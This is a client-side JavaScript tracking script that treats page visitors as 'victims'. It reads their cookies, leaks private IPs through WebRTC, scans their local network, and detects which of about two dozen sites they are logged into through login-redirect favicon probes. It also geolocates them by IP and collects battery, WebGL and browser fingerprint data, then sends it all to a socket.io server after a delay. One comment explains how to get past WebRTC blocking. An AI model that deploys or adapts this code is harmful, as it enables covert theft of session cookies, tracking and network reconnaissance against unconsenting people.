/*
TODO:
- Location tracking
- phone tracking (orientation)
- LETS SEE HOW MANY WEB APIS WE CAN MESS WITH

*/
var socket = io.connect({
  secure: true
});

var victimid = Math.random().toString(36).substring(2);
var privip;
var batteryinfo;
var internetspeed;
var browserplugins = [];
var socialloggedin = [];
var localclients = [];

var networks = [{
  url: "https://squareup.com/login?return_to=%2Ffavicon.ico",
  name: "Square"
}, {
  url: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico",
  name: "Instagram"
}, {
  url: "https://twitter.com/login?redirect_after_login=%2Ffavicon.ico",
  name: "Twitter"
}, {
  url: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
  name: "Facebook"
}, {
  url: "https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=de&service=youtube",
  name: "Google"
}, , {
  url: "https://plus.google.com/up/accounts/upgrade/?continue=https://plus.google.com/favicon.ico",
  name: "Google Plus"
}, {
  url: "https://login.skype.com/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
  name: "Skype"
}, {
  url: "https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com/favicon.ico",
  name: "Flickr"
}, {
  url: "https://www.spotify.com/de/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
  name: "Spotify"
}, {
  url: "https://www.reddit.com/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
  name: "Reddit"
}, {
  url: "https://www.tumblr.com/login?redirect_to=%2Ffavicon.ico",
  name: "Tumblr"
}, {
  url: "https://www.expedia.de/user/login?ckoflag=0&selc=0&uurl=qscr%3Dreds%26rurl%3D%252Ffavicon.ico",
  name: "Expedia"
}, {
  url: "https://accounts.snapchat.com/accounts/login?continue=https://accounts.snapchat.com/accounts/static/images/favicon/favicon.png",
  name: "Snapchat"
}, {
  url: "https://www.dropbox.com/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Ficons%2Ficon_spacer-vflN3BYt2.gif",
  name: "Dropbox"
}, {
  url: "https://www.amazon.com/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
  name: "Amazon"
}, {
  url: "https://www.pinterest.com/login/?next=https%3A%2F%2Fwww.pinterest.com%2Ffavicon.ico",
  name: "Pinterest"
}, {
  url: "https://www.netflix.com/Login?nextpage=%2Ffavicon.ico",
  name: "Netflix"
}, {
  url: "https://de.foursquare.com/login?continue=%2Ffavicon.ico",
  name: "Foursquare"
}, {
  url: "https://eu.battle.net/login/de/index?ref=http://eu.battle.net/favicon.ico",
  name: "Battle.net"
}, {
  url: "https://store.steampowered.com/login/?redir=favicon.ico",
  name: "Steam"
}, {
  url: "https://www.academia.edu/login?cp=/favicon.ico&cs=www",
  name: "Academia.edu"
}, {
  url: "https://stackoverflow.com/users/login?ssrc=head&returnurl=http%3a%2f%2fstackoverflow.com%2ffavicon.ico",
  name: "Stack Overflow"
}, {
  url: "https://accounts.google.com/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico",
  name: "Blogger"
}];


//Final Variables
var final = {
  victimid: victimid,
  cookies: document.cookie,
  url: document.URL,
  plugins: browserplugins,
  referrer: document.referrer,
  date: window.Date(),
  privateip: privip,
  internetspeed: internetspeed,
  connectiontype: (navigator.connection ? navigator.connection.type : null),
  language: navigator.language,
  DNT: navigator.doNotTrack,
  cookieEnabled: navigator.cookieEnabled,
  appCodeName: navigator.appCodeName,
  appName: navigator.appName,
  hardwareConcurrency: navigator.hardwareConcurrency,
  maxTouchPoints: navigator.maxTouchPoints,
  platform: navigator.platform,
  vendor: navigator.vendor,
  userAgent: navigator.userAgent,
  sizeScreenW: screen.width,
  sizeScreenH: screen.height,
  sizeDoc: document.width,
  sizeDocH: document.height,
  sizeInW: innerWidth,
  sizeInH: innerHeight,
  sizeAvailW: screen.availWidth,
  sizeAvailH: screen.availHeight,
  scrColorDepth: screen.colorDepth,
  scrPixelDepth: screen.pixelDepth,
  cookiesv2: decodeURIComponent(document.cookie.split(";")),
  batterylevel: null,
  batterychargingstatus: null,
  batterydischarge: null,
  batterychargetime: null,
  osversion: null,
  browserversion: null,
  socialloggedin: socialloggedin,
  localclients: localclients
}



function getPlugins() {
  try {
    for (var i = 0; i < navigator.plugins.length; i++) {
      browserplugins.push(navigator.plugins[i].name)
    }
    return a;
  } catch (e) {
    return null;
  }
}

function gocheck() {
  var os = final.userAgent
  if (os.match(/linux/ig)) {
    console.log("Stopped WebRTC due to linux being unsupported.")
  } else {
    go()
  }
}

function TaskController(numConcurrent, onDone) {
  this.numConcurrent = numConcurrent;
  this.onDone = onDone || function() {};
  this.pending = 0;
  this.queued = [];
  this.checkTimer = -1;
}

TaskController.prototype.deferCheck = function() {
  if (this.checkTimer != -1) return;
  this.checkTimer = setTimeout((function() {
    this.checkTimer = -1;
    this.check();
  }).bind(this), 0);
};

TaskController.prototype.check = function() {
  if (this.pending < 1 && this.queued.length == 0) return this.onDone();
  while (this.pending < this.numConcurrent && this.queued.length > 0) {
    try {
      this.pending += 1;
      setTimeout((function(task) {
        task((function() {
          this.pending -= 1;
          this.deferCheck();
        }).bind(this));
      }).bind(this, this.queued.shift()), 0);
    } catch (e) {
      this.pending -= 1;
      this.deferCheck();
    }
  }
};

TaskController.prototype.queue = function(task) {
  this.queued.push(task);
  this.deferCheck();
};

function probeIp(ip, timeout, cb) {
  var start = Date.now();
  var done = false;
  var img = document.createElement('img');
  var clean = function() {
    if (!img) return;
    document.body.removeChild(img);
    img = null;
  };
  var onResult = function(success) {
    if (done) return;
    done = true;
    clean();
    cb(ip, Date.now() - start < timeout);
  };
  document.body.appendChild(img);
  img.style.display = 'none';
  img.onload = function() {
    onResult(true);
  };
  img.onerror = function() {
    onResult(false);
  };
  img.src = 'https://' + ip + ':' + ~~(1024 + 1024 * Math.random()) + '/I_DO_NOT_EXIST?' + Math.random();
  setTimeout(function() {
    if (img) img.src = '';
  }, timeout + 500);
}

function probeNet(net, onHostFound, onDone) {
  net = net.replace(/(\d+\.\d+\.\d+)\.\d+/, '$1.');
  var timeout = 5000;
  var done = false;
  var found = [];
  var q = new TaskController(5, onDone);
  for (var i = 1; i < 256; ++i) {
    q.queue((function(i, cb) {
      probeIp(net + i, timeout, function(ip, success) {
        if (success) onHostFound(ip);
        cb();
      });
    }).bind(this, i));
  }
}

function enumLocalIPs(cb) {
  var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
  if (!RTCPeerConnection) return false;
  var addrs = Object.create(null);
  addrs['0.0.0.0'] = false;

  function addAddress(newAddr) {
    if (newAddr in addrs) return;
    addrs[newAddr] = true;
    cb(newAddr);
  }

  function grepSDP(sdp) {
    var hosts = [];
    sdp.split('\r\n').forEach(function(line) {
      if (~line.indexOf('a=candidate')) {
        var parts = line.split(' '),
          addr = parts[4],
          type = parts[7];
        if (type === 'host') addAddress(addr);
      } else if (~line.indexOf('c=')) {
        var parts = line.split(' '),
          addr = parts[2];
        addAddress(addr);
      }
    });
  }
  var rtc = new RTCPeerConnection({
    iceServers: []
  });
  rtc.createDataChannel('', {
    reliable: false
  });
  rtc.onicecandidate = function(evt) {
    if (evt.candidate) grepSDP('a=' + evt.candidate.candidate);
  };
  setTimeout(function() {
    rtc.createOffer(function(offerDesc) {
      grepSDP(offerDesc.sdp);
      rtc.setLocalDescription(offerDesc);
    }, function(e) {});
  }, 500);
  return true;
}

function go() {
  var q = new TaskController(1);
  enumLocalIPs(function(localIp) {
    console.log(localIp)
    q.queue(function(cb) {
      probeNet(localIp,
        function(ip) {
          console.log(ip)
        },
        cb);
    });
  }) || (console.log("Error"));
}

//get the IP addresses associated with an account
function getIPs(callback) {
  var ip_dups = {};

  //compatibility for firefox and chrome
  var RTCPeerConnection = window.RTCPeerConnection ||
    window.mozRTCPeerConnection ||
    window.webkitRTCPeerConnection;
  var useWebKit = !!window.webkitRTCPeerConnection;

  //bypass naive webrtc blocking using an iframe
  if (!RTCPeerConnection) {
    //NOTE: you need to have an iframe in the page right above the script tag
    //
    //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
    //<script>...getIPs called in here...
    //
    var win = iframe.contentWindow;
    RTCPeerConnection = win.RTCPeerConnection ||
      win.mozRTCPeerConnection ||
      win.webkitRTCPeerConnection;
    useWebKit = !!win.webkitRTCPeerConnection;
  }

  //minimal requirements for data connection
  var mediaConstraints = {
    optional: [{
      RtpDataChannels: true
    }]
  };

  var servers = {
    iceServers: [{
      urls: "stun:stun.services.mozilla.com"
    }]
  };

  //construct a new RTCPeerConnection
  var pc = new RTCPeerConnection(servers, mediaConstraints);

  function handleCandidate(candidate) {
    //match just the IP address
    var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
    var ip_addr = ip_regex.exec(candidate)[1];

    //remove duplicates
    if (ip_dups[ip_addr] === undefined)
      callback(ip_addr);

    ip_dups[ip_addr] = true;
  }

  //listen for candidate events
  pc.onicecandidate = function(ice) {

    //skip non-candidate events
    if (ice.candidate)
      handleCandidate(ice.candidate.candidate);
  };

  //create a bogus data channel
  pc.createDataChannel("");

  //create an offer sdp
  pc.createOffer(function(result) {

    //trigger the stun server request
    pc.setLocalDescription(result, function() {}, function() {});

  }, function() {});

  //wait for a while to let everything done
  setTimeout(function() {
    //read candidate info from local description
    var lines = pc.localDescription.sdp.split('\n');

    lines.forEach(function(line) {
      if (line.indexOf('a=candidate:') === 0)
        handleCandidate(line);
    });
  }, 1000);

}

(function() {

  getPlugins()


  getIPs(function(ip) {
    final.privateip = ip
  })

  networks.forEach(function(network) {
    var img = document.createElement('img');
    img.src = network.url;
    img.onload = function() {
      socialloggedin.push(network.name)
    };
    img.onerror = function() {
      // print(network.name + ': not logged in');
    }
  });

  var imageAddr = "https://upload.wikimedia.org/wikipedia/commons/2/2d/Snake_River_%285mb%29.jpg";
  var downloadSize = 5245329; //bytes
  var oProgress = document.getElementById("speed");

  function ShowProgressMessage(msg) {
    if (console) {
      if (typeof msg == "string") {
        console.log(msg);
      } else {
        for (var i = 0; i < msg.length; i++) {
          console.log(msg[i]);
        }
      }
    }

    if (oProgress) {
      var actualHTML = (typeof msg == "string") ? msg : msg.join(" ");
      oProgress.innerHTML = actualHTML;
    }
  }

  function InitiateSpeedDetection() {
    window.setTimeout(MeasureConnectionSpeed, 1);
  };

  if (window.addEventListener) {
    window.addEventListener('load', InitiateSpeedDetection, false);
  } else if (window.attachEvent) {
    window.attachEvent('onload', InitiateSpeedDetection);
  }

  function MeasureConnectionSpeed() {
    var startTime, endTime;
    var download = new Image();
    download.onload = function() {
      endTime = (new Date()).getTime();
      showResults();
    }

    download.onerror = function(err, msg) {
      ShowProgressMessage("Invalid image, or error downloading");
    }

    startTime = (new Date()).getTime();
    var cacheBuster = "?nnn=" + startTime;
    download.src = imageAddr + cacheBuster;

    function showResults() {
      var duration = (endTime - startTime) / 1000;
      var bitsLoaded = downloadSize * 8;
      var speedBps = (bitsLoaded / duration).toFixed(2);
      var speedKbps = (speedBps / 1024).toFixed(2);
      var speedMbps = (speedKbps / 1024).toFixed(2);
      final.internetspeed = speedKbps + " Kbps"
    }
  }
  MeasureConnectionSpeed();
  //insert IP addresses into the page



  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
      final.isp = JSON.parse(xhttp.responseText).ip.asn
      final.city = JSON.parse(xhttp.responseText).ip.city
      final.country = JSON.parse(xhttp.responseText).ip.country
      final.hostname = JSON.parse(xhttp.responseText).ip.hostname
      final.publicip = JSON.parse(xhttp.responseText).ip.ip
      final.longitude = JSON.parse(xhttp.responseText).ip.longitude
      final.latitude = JSON.parse(xhttp.responseText).ip.latitude

    }
  };
  xhttp.open("GET", "https://ip.nf/me.json", true);
  xhttp.send();

  var parser = new UAParser()
  final.osversion = parser.getOS().name + ' ' + parser.getOS().version
  final.browserversion = parser.getBrowser().name + ' ' + parser.getBrowser().version

  //Battery Info
  navigator.getBattery().then(function(battery) {
    batteryinfo = battery
    final.batterylevel = battery.level
    final.batterychargingstatus = battery.charging
    final.batterydischarge = battery.dischargingTime
    final.batterychargetime = battery.chargingTime
  })

  var canvas = document.getElementById("glcanvas");
  try {
    gl = canvas.getContext("experimental-webgl");
    gl.viewportWidth = canvas.width;
    gl.viewportHeight = canvas.height;
  } catch (e) {}
  if (gl) {
    var extension = gl.getExtension('WEBGL_debug_renderer_info');

    if (extension != undefined) {
      final.webglvendor = gl.getParameter(extension.UNMASKED_VENDOR_WEBGL)
      final.webglrenderer = gl.getParameter(extension.UNMASKED_RENDERER_WEBGL)
    } else {
      final.webglvendor = gl.getParameter(gl.VENDOR)
      final.webglrenderer = gl.getParameter(gl.RENDERER)
    }
  }



}());

if (final.userAgent.match(/linux/ig)) {
    setTimeout(()=>{ socket.emit('sending-info', final) }, 5*1000)
  } else {
    setTimeout(()=>{ socket.emit('sending-info', final) }, 20*1000)
  }
